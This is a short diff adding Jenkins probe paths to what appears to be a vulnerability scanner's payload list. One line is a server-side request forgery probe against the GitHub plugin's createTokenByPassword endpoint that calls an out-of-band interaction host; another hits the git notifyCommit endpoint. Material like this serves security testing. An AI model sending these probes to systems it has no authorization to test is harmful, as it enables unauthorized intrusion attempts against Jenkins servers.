@@ -1,0 +1,4 @@
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://{{interactsh-url}}
+/git/notifyCommit?url={{randstr}}&branches={{randstr}}
+
+/jenkins/
